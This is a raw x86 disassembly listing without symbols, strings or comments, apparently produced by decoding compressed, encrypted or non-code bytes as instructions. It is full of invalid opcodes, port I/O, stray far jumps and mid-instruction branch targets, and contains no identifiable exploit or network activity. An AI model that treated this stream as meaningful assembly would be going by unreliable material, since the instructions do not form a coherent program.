  40e0fa:	pop    ecx
  40e0fb:	mov    al,ds:0x1b5d14cd
  40e100:	pop    edx
  40e101:	call   0xec67aa15
  40e106:	pop    ss
  40e107:	test   BYTE PTR [esi-0x51f688d6],0xef
  40e10e:	push   ss
  40e10f:	sub    DWORD PTR [eax-0x79],esi
  40e112:	ror    ch,0xc7
  40e115:	sub    bh,bh
  40e117:	mov    edi,esi
  40e119:	or     DWORD PTR [esi-0x61],ebp
  40e11c:	add    ebx,DWORD PTR [eax+0x6d9c206c]
  40e122:	pop    edi
  40e123:	out    dx,al
  40e124:	fild   WORD PTR [ebx+0x7c1ca341]
  40e12a:	fstp   TBYTE PTR [edi+0x39]
  40e12d:	out    dx,eax
  40e12e:	sahf   
  40e12f:	cmp    cl,BYTE PTR [ecx]
  40e131:	ins    DWORD PTR es:[edi],dx
  40e132:	ficom  DWORD PTR [ebp-0x21]
  40e135:	add    edx,DWORD PTR [edx+esi*8-0x54eecd28]
  40e13c:	sub    DWORD PTR [ebp+0x3199fad2],esi
  40e142:	push   cs
  40e143:	jbe    0x40e16c
  40e145:	punpckhwd mm6,QWORD PTR [ecx]
  40e148:	mov    WORD PTR [ebp+0x5443fcc1],es
  40e14e:	scas   al,BYTE PTR es:[edi]
  40e14f:	mov    al,ds:0x96d3f37e
  40e154:	inc    edx
  40e155:	xchg   edi,eax
  40e156:	outs   dx,DWORD PTR ds:[esi]
  40e157:	int3   
  40e158:	jge    0x40e130
  40e15a:	jnp    0x40e122
  40e15c:	(bad)  
  40e15d:	shl    edx,cl
  40e15f:	inc    esi
  40e160:	cmp    al,0x1d
  40e162:	jg     0x40e18d
  40e164:	sub    eax,0x1f637b5f
  40e169:	pop    ebx
  40e16a:	pop    ebp
  40e16b:	mov    edi,0xa19e5d9c
  40e170:	or     ebp,DWORD PTR ds:[ebx]
  40e173:	jo     0x40e14e
  40e175:	xchg   esp,eax
  40e176:	sbb    al,0x0
	...
  40e1bc:	add    BYTE PTR [eax],al
  40e1be:	add    BYTE PTR [edx-0x406b4a4f],bl
  40e1c4:	xchg   esp,eax
  40e1c5:	mov    ebx,0x5d8b00bf
  40e1ca:	sbb    ecx,DWORD PTR [eax+0x7b6225c2]
  40e1d0:	call   0x760e1d5
  40e1d5:	add    BYTE PTR [eax],al
  40e1d7:	mov    cl,0x8a
  40e1d9:	add    bl,bh
  40e1db:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40e1dd:	adc    al,0x71
  40e1df:	adc    al,0x30
  40e1e1:	pop    ebx
  40e1e2:	sbb    DWORD PTR [esi+0x5ae6eff],ecx
  40e1e8:	icebp  
  40e1e9:	sbb    BYTE PTR [esi],ch
  40e1eb:	jno    0x40e194
  40e1ed:	mov    ch,0x1e
  40e1ef:	adc    BYTE PTR [ecx],bl
  40e1f1:	and    DWORD PTR [ebx+ebp*8+0x4303c0ba],esp
  40e1f8:	shr    DWORD PTR ds:0x930d9f06,0x2f
  40e1ff:	adc    si,WORD PTR [edi-0x573203]
  40e206:	or     DWORD PTR [edx+0x178b9651],esp
  40e20c:	lods   eax,DWORD PTR ds:[esi]
  40e20d:	call   0xfff9f497
  40e212:	push   cs
  40e213:	pop    ebx
  40e214:	cmp    bl,0xf7
  40e217:	imul   edi,DWORD PTR [esi],0x4a
  40e21a:	out    0xbd,al
  40e21c:	jl     0x40e239
  40e21e:	ret    
  40e21f:	xchg   esp,eax
  40e220:	and    bh,BYTE PTR [edi-0x21]
  40e223:	or     al,BYTE PTR [esi+eiz*8-0x38]
  40e227:	rcl    DWORD PTR [eax+ebp*1+0x1],0x5a
  40e22c:	rol    BYTE PTR [edx-0x46d0f727],0xf3
  40e233:	dec    eax
  40e234:	push   0xdbecc06b
  40e239:	mov    ch,0xa2
  40e23b:	mov    esp,0x9a0aba98
  40e240:	je     0x40e26a
  40e242:	lock sbb BYTE PTR [edx-0x2f],ah
  40e246:	pushf  
  40e247:	or     bl,al
  40e249:	je     0x40e22d
  40e24b:	pop    ebx
  40e24c:	xchg   ecx,eax
  40e24d:	add    al,0xdc
  40e24f:	sar    BYTE PTR [eax-0x6755109a],1
  40e255:	adc    cl,dl
  40e257:	(bad)  
  40e258:	fisubr WORD PTR [ebx+ecx*1+0x1b95b734]
  40e25f:	pop    es
  40e260:	sub    DWORD PTR [eax+ebx*2-0x78],edi
  40e264:	jp     0x40e1e7
  40e266:	std    
  40e267:	mov    eax,0x2fd23d9a
  40e26c:	mov    dh,0xab
  40e26e:	jmp    0x40e2b8
  40e270:	test   eax,0x86fa12cd
  40e275:	xor    eax,ecx
  40e277:	dec    edx
  40e278:	push   esi
  40e279:	or     BYTE PTR [eax+0x17be020d],ch
  40e27f:	sub    BYTE PTR [eax],al
  40e281:	pop    ebx
  40e282:	in     al,0x9e
  40e284:	adc    eax,0x93b48b6a
  40e289:	(bad)  
  40e28a:	ret    
  40e28b:	(bad)  
  40e28c:	dec    ebp
  40e28d:	mov    esp,DWORD PTR [eax]
  40e28f:	outs   dx,DWORD PTR ds:[esi]
  40e290:	loope  0x40e2b9
  40e292:	push   0x9a96a67b
  40e297:	pop    esi
  40e298:	mov    ah,0x9b
  40e29a:	scas   eax,DWORD PTR es:[edi]
  40e29b:	xchg   esp,eax
  40e29c:	dec    ebx
  40e29d:	in     eax,0xe2
  40e29f:	das    
  40e2a0:	ret    
  40e2a1:	xor    al,0x46
  40e2a3:	sbb    ah,BYTE PTR ds:0xe97ab1b0
  40e2a9:	fmul   QWORD PTR [edx]
  40e2ab:	mov    esi,0xa8d0b6c8
  40e2b0:	xchg   ecx,eax
  40e2b1:	push   edx
  40e2b2:	mov    ah,0x7a
  40e2b4:	push   0x72ad1d64
  40e2b9:	jb     0x40e287
  40e2bb:	es mov ecx,0x5ce46414
  40e2c1:	(bad)  
  40e2c2:	sbb    eax,0xe6f4f637
  40e2c7:	rol    DWORD PTR [edi+0x41],0xb6
  40e2cb:	pop    ebx
  40e2cc:	aaa    
  40e2cd:	push   esp
  40e2ce:	inc    eax
  40e2cf:	pushf  
  40e2d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e2d1:	imul   ebx,DWORD PTR [ebx+ebp*8-0x2d983f17],0xf4569096
  40e2dc:	dec    edx
  40e2dd:	pop    ss
  40e2de:	add    eax,0x8420aeec
  40e2e3:	(bad)  
  40e2e4:	pcmpeqw mm7,mm0
  40e2e7:	hlt    
  40e2e8:	arpl   si,di
  40e2ea:	sar    bh,0x9b
  40e2ed:	(bad)  
  40e2ef:	rol    BYTE PTR [eax-0x7],1
  40e2f2:	and    DWORD PTR [ebp+ebp*4+0x549780fd],ecx
  40e2f9:	jnp    0x40e326
  40e2fb:	cmp    BYTE PTR [esi+esi*2+0x7c3da77a],ah
  40e302:	jp     0x40e2b4
  40e304:	(bad)  
  40e306:	jb     0x40e321
  40e308:	push   ebp
  40e309:	in     al,0x2d
  40e30b:	sub    al,0x38
  40e30d:	stc    
  40e30e:	sahf   
  40e30f:	push   esi
  40e310:	jmp    0xf421f4bc
  40e315:	mov    esi,0x546252c3
  40e31a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e31b:	push   ebx
  40e31c:	ds pop ecx
  40e31e:	mov    eax,fs:0x9f03db6a
  40e324:	xchg   DWORD PTR fs:[edx+esi*1],esi
  40e328:	mov    esp,0x9f97cf33
  40e32d:	jmp    0x40e33e
  40e32f:	enter  0x190a,0xc2
  40e333:	cs jae 0x40e395
  40e336:	in     al,0xc
  40e338:	dec    edx
  40e339:	frstor [ecx+edi*2]
  40e33c:	mov    dh,0x9e
  40e33e:	dec    edx
  40e33f:	inc    edx
  40e340:	loop   0x40e34f
  40e342:	popa   
  40e343:	push   esi
  40e344:	mov    esi,0x451aa3d
  40e349:	call   0x420a:0xd16bfec9
  40e350:	call   FWORD PTR [ebp-0x1f]
  40e353:	mov    bl,0x40
  40e355:	push   edi
  40e356:	add    ch,BYTE PTR [ecx]
  40e358:	mov    ds:0xae2d4560,al
  40e35d:	lahf   
  40e35e:	dec    ebx
  40e35f:	(bad)  
  40e360:	dec    edx
  40e361:	popa   
  40e362:	xchg   ebx,eax
  40e363:	int    0xfc
  40e365:	hlt    
  40e366:	test   eax,0x932c5cd1
  40e36b:	mov    eax,0x9a3b125c
  40e370:	mov    bl,0xe
  40e372:	adc    bl,BYTE PTR [edx+0x23]
  40e375:	adc    al,0x9b
  40e377:	clc    
  40e378:	scas   eax,DWORD PTR es:[edi]
  40e379:	fild   WORD PTR [edx]
  40e37b:	daa    
  40e37c:	jge    0x40e31f
  40e37e:	lods   al,BYTE PTR ds:[esi]
  40e37f:	or     al,0x9c
  40e381:	ins    DWORD PTR es:[edi],dx
  40e382:	mov    al,0xf3
  40e384:	mov    ebp,0xc3d9d927
  40e389:	sti    
  40e38a:	pop    esp
  40e38b:	loopne 0x40e3ab
  40e38d:	inc    esi
  40e38e:	icebp  
  40e38f:	jbe    0x40e311
  40e391:	nop
  40e392:	mov    ds:0x1022e1cc,eax
  40e397:	inc    ebp
  40e398:	mov    ch,0x79
  40e39a:	adc    BYTE PTR ds:0x3ea984b2,bh
  40e3a0:	mov    edi,0x7fdb64a8
  40e3a5:	mov    ds:0x23c10f40,al
  40e3aa:	xchg   ebp,eax
  40e3ab:	out    0xd4,eax
  40e3ad:	pop    ebp
  40e3ae:	aad    0xb9
  40e3b0:	or     al,0xb3
  40e3b2:	and    DWORD PTR [esi],0x37f18dcf
  40e3b8:	mov    eax,ds:0x2e10ae7a
  40e3bd:	jge    0x40e424
  40e3bf:	(bad)  
  40e3c0:	adc    BYTE PTR [ebx-0x7b],dh
  40e3c3:	stc    
  40e3c4:	jl     0x40e443
  40e3c6:	inc    ebx
  40e3c7:	pop    ebx
  40e3c8:	ja     0x40e355
  40e3ca:	loopne 0x40e406
  40e3cc:	jmp    0x2830c239
  40e3d1:	jno    0x40e3bd
  40e3d3:	push   edx
  40e3d4:	xchg   ecx,eax
  40e3d5:	cld    
  40e3d6:	xchg   ecx,eax
  40e3d7:	cmp    bl,ch
  40e3d9:	inc    DWORD PTR [ecx]
  40e3db:	cdq    
  40e3dc:	sub    DWORD PTR [eax-0x1d],ebx
  40e3df:	add    al,0xc5
  40e3e1:	jg     0x40e391
  40e3e3:	mov    esi,0x41c660ee
  40e3e8:	pusha  
  40e3e9:	adc    ebp,0x3fdae49d
  40e3ef:	stos   DWORD PTR es:[edi],eax
  40e3f0:	fwait
  40e3f1:	outs   dx,BYTE PTR ds:[esi]
  40e3f2:	adc    ch,BYTE PTR [edx+0x152bf862]
  40e3f8:	in     al,0x4b
  40e3fa:	ret    
  40e3fb:	out    dx,eax
  40e3fc:	push   ebp
  40e3fd:	test   DWORD PTR [edi+0x5cc2cf67],0x18fa2753
  40e407:	jo     0x40e3ed
  40e409:	rcl    DWORD PTR [eax],1
  40e40b:	call   0x3ef02e48
  40e410:	fs pop esp
  40e412:	xor    ah,bl
  40e414:	pushf  
  40e415:	dec    esi
  40e416:	fcomi  st,st(2)
  40e418:	cwde   
  40e419:	clc    
  40e41a:	push   es
  40e41b:	out    0xd8,eax
  40e41d:	ror    DWORD PTR [esi+0x769c727c],cl
  40e423:	pusha  
  40e424:	push   esp
  40e425:	cs mov bh,0xdc
  40e428:	imul   ebx,DWORD PTR [ebx],0xffffffdf
  40e42b:	xor    BYTE PTR [ebp-0x1f1ab022],0xa2
  40e432:	nop/reserved BYTE PTR [edx+0x7f]
  40e436:	lea    eax,[esi]
  40e438:	cld    
  40e439:	jno    0x40e3c0
  40e43b:	push   ebx
  40e43c:	adc    BYTE PTR [eax+0xf2c83eb],0x17
  40e443:	push   esi
  40e444:	iret   
  40e445:	sbb    DWORD PTR [edi+0x974e151],0x66d27106
  40e44f:	(bad)  
  40e450:	loop   0x40e47b
  40e452:	push   esi
  40e453:	push   ss
  40e454:	mov    ah,bl
  40e456:	ins    BYTE PTR es:[edi],dx
  40e457:	xor    al,0xcd
  40e459:	loope  0x40e4a9
  40e45b:	mov    ebp,0x5966c8d4
  40e460:	bound  ecx,QWORD PTR [ebp+0x5c7bbad4]
  40e466:	test   BYTE PTR [edx+ebp*2+0x50],ah
  40e46a:	mov    ebp,0x91c71339
  40e46f:	imul   edi,DWORD PTR [edi+0x55],0x3f
  40e473:	lods   al,BYTE PTR ds:[esi]
  40e474:	loop   0x40e459
  40e476:	jno    0x40e3fb
  40e478:	dec    esp
  40e479:	ficomp WORD PTR [edi+0x6f06ba1e]
  40e47f:	sti    
  40e480:	dec    edi
  40e481:	jne    0x40e4aa
  40e483:	pusha  
  40e484:	int3   
  40e485:	xchg   esi,eax
  40e486:	stc    
  40e487:	pop    es
  40e488:	dec    ecx
  40e489:	push   cs
  40e48a:	rcl    BYTE PTR [ebp+0x6f1a8a58],cl
  40e490:	jmp    0x90f4:0x953d355a
  40e497:	retf   0xe57c
  40e49a:	fdivr  QWORD PTR [esi]
  40e49c:	repnz dec edx
  40e49e:	xchg   ebp,eax
  40e49f:	xor    eax,0xf5e351
  40e4a4:	out    0xd8,al
  40e4a6:	(bad)  
  40e4a7:	mov    ebx,0x8e61b038
  40e4ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e4ad:	in     al,0xe4
  40e4af:	add    DWORD PTR [edi-0x3eaa551e],ecx
  40e4b5:	unpckhps xmm3,XMMWORD PTR es:[ebx+0x41ed0768]
  40e4bd:	ror    BYTE PTR [edx],cl
  40e4bf:	pushf  
  40e4c0:	js     0x40e4ed
  40e4c2:	pop    es
  40e4c3:	mov    ss,WORD PTR [edx+0x3dfab208]
  40e4c9:	add    al,BYTE PTR [eax]
  40e4cb:	jnp    0x40e4ad
  40e4cd:	outs   dx,DWORD PTR ds:[esi]
  40e4ce:	sti    
  40e4cf:	and    al,0xf7
  40e4d1:	call   0xedfc:0x9803a5c9
  40e4d8:	inc    esp
  40e4d9:	stos   DWORD PTR es:[edi],eax
  40e4da:	xlat   BYTE PTR ds:[ebx]
  40e4db:	hlt    
  40e4dc:	lahf   
  40e4dd:	push   0xffffff97
  40e4df:	xchg   ebp,eax
  40e4e0:	bound  ebx,QWORD PTR [ebx+0x558a27f3]
  40e4e6:	adc    ebp,DWORD PTR [edi+ebx*8-0x1f]
  40e4ea:	aas    
  40e4eb:	inc    esp
  40e4ec:	les    ebx,FWORD PTR [ebp-0x5d8847e2]
  40e4f2:	pusha  
  40e4f3:	xlat   BYTE PTR ds:[ebx]
  40e4f4:	adc    eax,0xaf03cd2a
  40e4f9:	jb     0x40e4de
  40e4fb:	in     al,dx
  40e4fc:	ret    0x37eb
  40e4ff:	shr    BYTE PTR [ebp+0x6b],0xc9
  40e503:	dec    edi
  40e504:	sahf   
  40e505:	or     bh,ch
  40e507:	mov    edi,DWORD PTR [edx]
  40e509:	push   0x6f
  40e50b:	pusha  
  40e50c:	sub    BYTE PTR [esi+0x477c95ee],bh
  40e512:	inc    edx
  40e513:	loopne 0x40e49a
  40e515:	jl     0x40e539
  40e517:	scas   al,BYTE PTR es:[edi]
  40e518:	popa   
  40e519:	in     al,0x6
  40e51b:	sti    
  40e51c:	push   cs
  40e51d:	and    DWORD PTR [edi+eiz*8-0x1b2e8c0b],esp
  40e524:	ja     0x40e4c2
  40e526:	jo     0x40e4fa
  40e528:	push   es
  40e529:	jnp    0x40e4bf
  40e52b:	sub    eax,0x11fdc57b
  40e530:	mov    dh,0xf2
  40e532:	data16 sahf 
  40e534:	(bad)  
  40e536:	das    
  40e537:	pop    es
  40e538:	ja     0x40e549
  40e53a:	and    ecx,edi
  40e53c:	inc    eax
  40e53d:	sar    BYTE PTR [eax],1
  40e53f:	jo     0x40e4df
  40e541:	call   0x93b6a10a
  40e546:	jl     0x40e540
  40e548:	lods   al,BYTE PTR ds:[esi]
  40e549:	outs   dx,BYTE PTR ds:[esi]
  40e54a:	jns    0x40e5bb
  40e54c:	or     DWORD PTR ds:0x952de929,esp
  40e552:	mov    edi,0x5d881125
  40e557:	and    BYTE PTR [edi],ch
  40e559:	sub    eax,0xc2846057
  40e55e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e55f:	pushf  
  40e560:	and    DWORD PTR [ebp+eiz*1-0x5f360ba5],ecx
  40e567:	cmp    edi,DWORD PTR [eax-0xf7b4217]
  40e56d:	and    bl,dh
  40e56f:	sbb    dl,BYTE PTR [ebp-0x7]
  40e572:	dec    edx
  40e573:	adc    eax,0xfbfa21a1
  40e578:	or     ebp,DWORD PTR [ebp-0x48bfa205]
  40e57e:	and    al,0xa3
  40e580:	rcr    DWORD PTR [edx],0x2f
  40e583:	das    
  40e584:	mov    al,ds:0xd6ca7e68
  40e589:	(bad)  
  40e58a:	lods   eax,DWORD PTR ds:[esi]
  40e58b:	sbb    dh,BYTE PTR [ecx]
  40e58d:	inc    edi
  40e58e:	imul   edx,DWORD PTR [edx],0xdb0b8052
  40e594:	add    dl,BYTE PTR [eax+0x5b]
  40e597:	imul   ebx
  40e599:	aam    0x33
  40e59b:	fwait
  40e59c:	pop    ds
  40e59d:	pop    eax
  40e59e:	xor    eax,0x8a408cb8
  40e5a3:	test   al,0x8b
  40e5a5:	mov    cl,0xf7
  40e5a7:	fdivr  DWORD PTR ds:0x8e4e7b14
  40e5ad:	sti    
  40e5ae:	sbb    DWORD PTR [edi+0x2c24a126],ebx
  40e5b4:	sbb    al,0x7e
  40e5b6:	or     esp,DWORD PTR [ebx-0x72]
  40e5b9:	les    esp,FWORD PTR [ebx+0x4]
  40e5bc:	imul   ebx,DWORD PTR [edx-0x6dd2b7f3],0xffffffd7
  40e5c3:	dec    edx
  40e5c4:	hlt    
  40e5c5:	data16 data16 daa 
  40e5c8:	loope  0x40e5cd
  40e5ca:	sub    ch,bl
  40e5cc:	mov    WORD PTR [edx],cs
  40e5ce:	sbb    eax,0x54f58de0
  40e5d3:	shl    BYTE PTR [ecx-0x44],1
  40e5d6:	imul   ebp,DWORD PTR [edi+0x3e],0x31
  40e5da:	inc    eax
  40e5db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e5dc:	fs out 0xa5,al
  40e5df:	xor    eax,0xafa2b7f7
  40e5e4:	inc    eax
  40e5e5:	sbb    eax,0xd2adf230
  40e5ea:	xchg   edi,eax
  40e5eb:	pop    ss
  40e5ec:	push   ebp
  40e5ed:	pop    es
  40e5ee:	jg     0x40e65f
  40e5f0:	sahf   
  40e5f1:	movlhps xmm7,xmm1
  40e5f4:	jle    0x40e668
  40e5f6:	push   ecx
  40e5f7:	jo     0x40e5c1
  40e5f9:	or     eax,0xef4e951c
  40e5fe:	xchg   ecx,eax
  40e5ff:	jb     0x40e680
  40e601:	sub    edi,DWORD PTR [ebx+0x58]
  40e604:	cmp    al,0xdb
  40e606:	push   0x15ff8a41
  40e60b:	mov    dl,0xff
  40e60d:	aaa    
  40e60e:	push   ds
  40e60f:	jg     0x40e596
  40e611:	mov    DWORD PTR [ecx-0x6b],esp
  40e614:	xchg   esp,eax
  40e615:	xchg   esi,eax
  40e616:	mov    al,0x9d
  40e618:	jmp    0x40e5fb
  40e61a:	jae    0x40e620
  40e61c:	jno    0x40e69a
  40e61e:	mov    esp,0x928f20d5
  40e623:	cmc    
  40e624:	mov    DWORD PTR [ecx-0x78b61608],edx
  40e62a:	(bad)  
  40e62b:	cmp    BYTE PTR [eax-0x462e1bba],al
  40e631:	dec    esp
  40e632:	jae    0x40e629
  40e634:	mov    ebx,0xec4691ba
  40e639:	cmp    eax,0xe0b9244f
  40e63e:	shl    DWORD PTR [ebp-0x6142e14c],cl
  40e644:	sub    eax,0x745d70e1
  40e649:	(bad)  
  40e64b:	jle    0x40e680
  40e64d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e64e:	(bad)  
  40e64f:	mov    edx,0xe32bbe28
  40e654:	cdq    
  40e655:	push   ebx
  40e656:	xchg   esi,eax
  40e657:	loope  0x40e610
  40e659:	mov    dl,0x16
  40e65b:	ret    
  40e65c:	push   0x998c8b91
  40e661:	sub    eax,ebx
  40e663:	rcl    BYTE PTR [esi],0x9b
  40e666:	or     BYTE PTR [edi],ah
  40e668:	jne    0x40e60d
  40e66a:	sbb    eax,0x3a649f1
  40e66f:	add    ah,BYTE PTR [eax]
  40e671:	xchg   DWORD PTR [edx-0x70355591],ebp
  40e677:	push   esi
  40e678:	and    DWORD PTR [ebp+0x18],0x39e549bb
  40e67f:	push   ebx
  40e680:	int    0xf5
  40e682:	frstor [edi+0x45]
  40e685:	aas    
  40e686:	cmp    al,BYTE PTR [ecx+0x61]
  40e689:	and    BYTE PTR [ebp-0xb36e09f],bh
  40e68f:	outs   dx,BYTE PTR ds:[esi]
  40e690:	fcomip st,st(4)
  40e692:	inc    ebx
  40e693:	jge    0x40e623
  40e695:	mov    ebx,DWORD PTR [ebp+0x60807a16]
  40e69b:	jmp    0x40e6a2
  40e69d:	mov    ch,0x47
  40e69f:	adc    esp,DWORD PTR [ebp+0x49c663d4]
  40e6a5:	test   al,0x39
  40e6a7:	into   
  40e6a8:	retf   0x2711
  40e6ab:	dec    ebx
  40e6ac:	jmp    0x71ff:0x5765ee01
  40e6b3:	test   BYTE PTR [ebx-0x31],al
  40e6b6:	pusha  
  40e6b7:	aaa    
  40e6b8:	lods   al,BYTE PTR ds:[esi]
  40e6b9:	sub    DWORD PTR ds:0x1c1c2286,ebx
  40e6bf:	pop    esp
  40e6c0:	mov    ebp,0x67e72cad
  40e6c5:	sbb    dl,BYTE PTR [ebp-0x20]
  40e6c8:	fdiv   st,st(1)
  40e6ca:	or     ebp,DWORD PTR [esi+0x35]
  40e6cd:	xchg   edx,eax
  40e6ce:	lock cdq 
  40e6d0:	in     eax,dx
  40e6d1:	mov    ebp,0xcd70576
  40e6d6:	and    eax,0x929b6580
  40e6db:	or     esi,DWORD PTR [ebx+ebp*4+0x4a]
  40e6df:	adc    eax,0x58b53b43
  40e6e4:	inc    ecx
  40e6e5:	mov    esp,0x6e62b4d
  40e6ea:	jg     0x40e6cf
  40e6ec:	fmul   DWORD PTR [eax]
  40e6ee:	xlat   BYTE PTR ds:[ebx]
  40e6ef:	xor    ah,BYTE PTR [ecx]
  40e6f1:	enter  0x2833,0xaa
  40e6f5:	das    
  40e6f6:	mov    ebp,0xbccd3381
  40e6fb:	pop    ecx
  40e6fc:	sub    esp,ebx
  40e6fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6ff:	fisubr WORD PTR cs:[ebx-0x4d]
  40e703:	push   eax
  40e704:	pop    ebp
  40e705:	mov    ecx,0x7c448c40
  40e70a:	dec    edx
  40e70b:	and    dh,bl
  40e70d:	(bad)  
  40e70e:	hlt    
  40e70f:	stc    
  40e710:	daa    
  40e711:	ret    0xfc70
  40e714:	push   ds
  40e715:	repnz xor al,0x67
  40e718:	sbb    BYTE PTR [ebx+0xd],dl
  40e71b:	test   eax,0xde128086
  40e720:	scas   al,BYTE PTR es:[edi]
  40e721:	sub    ebx,DWORD PTR [edx]
  40e723:	dec    ecx
  40e724:	stos   BYTE PTR es:[edi],al
  40e725:	jnp    0x40e783
  40e727:	ror    BYTE PTR [ebp+0x946a0ed],cl
  40e72d:	inc    eax
  40e72e:	dec    esi
  40e72f:	push   eax
  40e730:	mov    WORD PTR [eax-0x72132cea],ss
  40e736:	and    ch,bl
  40e738:	fmul   DWORD PTR ds:0xb4866479
  40e73e:	jne    0x40e775
  40e740:	jmp    0xa6c1:0x2de0c06e
  40e747:	fild   WORD PTR [ecx-0x6d]
  40e74a:	out    dx,al
  40e74b:	dec    ecx
  40e74c:	pop    ds
  40e74d:	imul   esi,eax,0xc00f214
  40e753:	push   esp
  40e754:	or     esp,ebx
  40e756:	push   es
  40e757:	xor    ah,BYTE PTR [eax+0x12]
  40e75a:	push   eax
  40e75b:	imul   edi,DWORD PTR [esi+0x2daec77e],0x55033b01
  40e765:	inc    edx
  40e766:	test   eax,0x95df5352
  40e76b:	je     0x40e7ca
  40e76d:	sbb    esi,DWORD PTR [esi+edx*4+0x1652c6e]
  40e774:	lock add dl,cl
  40e777:	fmul   st,st(7)
  40e779:	or     ch,BYTE PTR [ecx]
  40e77b:	outs   dx,DWORD PTR ds:[esi]
  40e77c:	scas   eax,DWORD PTR es:[edi]
  40e77d:	pop    ebp
  40e77e:	ror    BYTE PTR [ebp+0x67],cl
  40e781:	imul   edx,ecx,0x27b3b5af
  40e787:	mov    cl,0x24
  40e789:	imul   esi,ebp,0xffffffb5
  40e78c:	jg     0x40e76a
  40e78e:	mov    ebp,DWORD PTR [bx+di+0x1386]
  40e793:	jge    0x40e7e4
  40e795:	pop    ebx
  40e796:	push   0x71c5bebe
  40e79b:	jle    0x40e74a
  40e79d:	lahf   
  40e79e:	cwde   
  40e79f:	or     eax,0x3d7b3f90
  40e7a4:	jmp    0x40e756
  40e7a6:	jno    0x40e7f7
  40e7a8:	(bad)  
  40e7a9:	jnp    0x40e7ba
  40e7ab:	lods   al,BYTE PTR ds:[esi]
  40e7ac:	bound  esi,QWORD PTR [eax+0x7be9ffe4]
  40e7b2:	or     ecx,ecx
  40e7b4:	xor    ah,BYTE PTR [esi+eiz*4]
  40e7b7:	(bad)
  40e7ba:	lds    ebp,FWORD PTR [ebx-0x12c804e]
  40e7c0:	push   eax
  40e7c1:	add    DWORD PTR [edx+0x3e],ecx
  40e7c4:	and    BYTE PTR [ebx],ah
  40e7c6:	call   0x6967ad4c
  40e7cb:	pop    es
  40e7cc:	std    
  40e7cd:	inc    eax
  40e7ce:	or     al,0xde
  40e7d0:	jmp    0x40e76a
  40e7d2:	call   0x43df5dac
  40e7d7:	pushf  
  40e7d8:	xlat   BYTE PTR ss:[ebx]
  40e7da:	ja     0x40e7b1
  40e7dc:	push   edx
  40e7dd:	and    eax,0xcb6e6afc
  40e7e2:	xchg   edi,eax
  40e7e3:	mov    bh,0x8d
  40e7e5:	inc    eax
  40e7e6:	lds    edi,FWORD PTR [edi+edi*1]
  40e7e9:	nop
  40e7ea:	adc    ebp,DWORD PTR [eax-0xf76f0ab]
  40e7f0:	mov    ebp,0x3529c892
  40e7f5:	inc    ebx
  40e7f6:	ficomp DWORD PTR [eax+0x9]
  40e7f9:	jne    0x40e7f9
  40e7fb:	(bad)  
  40e7fc:	mov    esi,0xeca5ed3a
  40e801:	imul   ebp,DWORD PTR [esi+edx*8],0x76f94cd4
  40e808:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e809:	sbb    al,0xd8
  40e80b:	mov    dl,0x76
  40e80d:	cmp    al,BYTE PTR [eax]
  40e80f:	sub    edi,DWORD PTR [ecx-0x3636d7ba]
  40e815:	xor    BYTE PTR [ebp-0x49],cl
  40e818:	hlt    
  40e819:	std    
  40e81a:	add    eax,DWORD PTR [edx+0xc4eda42]
  40e820:	data16 sbb bh,bh
  40e823:	test   DWORD PTR [edx],esi
  40e825:	cmp    BYTE PTR [ecx+0x4083103d],ch
  40e82b:	or     bh,ah
  40e82d:	push   ebx
  40e82e:	push   eax
  40e82f:	fld    st(6)
  40e831:	dec    eax
  40e832:	(bad)  
  40e833:	xchg   esp,eax
  40e834:	call   0x1998:0xb721bd3
  40e83b:	add    BYTE PTR [edx],cl
  40e83d:	popa   
  40e83e:	push   edi
  40e83f:	mov    ch,0x87
  40e841:	or     BYTE PTR [edx-0x11],bl
  40e844:	jmp    0xe4f2:0xd35f2295
  40e84b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e84c:	mov    bh,0x36
  40e84e:	test   esi,esp
  40e850:	xor    dh,BYTE PTR [edx]
  40e852:	inc    ebp
  40e853:	call   0x146e9bd4
  40e858:	sahf   
  40e859:	rcr    BYTE PTR [ecx],0x1d
  40e85c:	sub    DWORD PTR [eax+0x1e],ebx
  40e85f:	pusha  
  40e860:	fwait
  40e861:	leave  
  40e862:	mov    al,0xec
  40e864:	jne    0x40e86e
  40e866:	mov    esi,0x2e19bc13
  40e86b:	iret   
  40e86c:	les    esi,FWORD PTR [edx-0x656311cc]
  40e872:	add    ebp,DWORD PTR [edi-0x27a9b0a5]
  40e878:	mov    eax,0x5bfc05c2
  40e87d:	in     eax,0xca
  40e87f:	inc    eax
  40e880:	xor    ebx,DWORD PTR [edi]
  40e882:	int3   
  40e883:	sub    eax,0x4a574f2d
  40e888:	ins    DWORD PTR es:[edi],dx
  40e889:	ficomp DWORD PTR [eax+0x50]
  40e88c:	fistp  QWORD PTR [edx+ebx*8]
  40e88f:	push   ss
  40e890:	cs dec ebx
  40e892:	ror    DWORD PTR [ecx-0x11],1
  40e895:	int    0x1f
  40e897:	fbstp  TBYTE PTR [edi+0x4228baec]
  40e89d:	ins    BYTE PTR es:[edi],dx
  40e89e:	cmc    
  40e89f:	fist   WORD PTR [ebx]
  40e8a1:	mov    esp,0xade8cd64
  40e8a6:	inc    edx
  40e8a7:	je     0x40e890
  40e8a9:	push   ecx
  40e8aa:	jno    0x40e899
  40e8ac:	shr    DWORD PTR [edi],cl
  40e8ae:	jmp    0x40e8e5
  40e8b0:	stc    
  40e8b1:	mov    bh,0x8
  40e8b3:	dec    ebp
  40e8b4:	int    0x3a
  40e8b6:	out    dx,al
  40e8b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e8b8:	mov    ebx,0x9f524be0
  40e8bd:	aaa    
  40e8be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e8bf:	add    al,0xdd
  40e8c1:	pop    esi
  40e8c2:	jns    0x40e8fb
  40e8c4:	pusha  
  40e8c5:	in     al,dx
  40e8c6:	xchg   ebx,eax
  40e8c7:	xchg   ebx,eax
  40e8c8:	leave  
  40e8c9:	in     al,0x32
  40e8cb:	adc    ecx,DWORD PTR [edi]
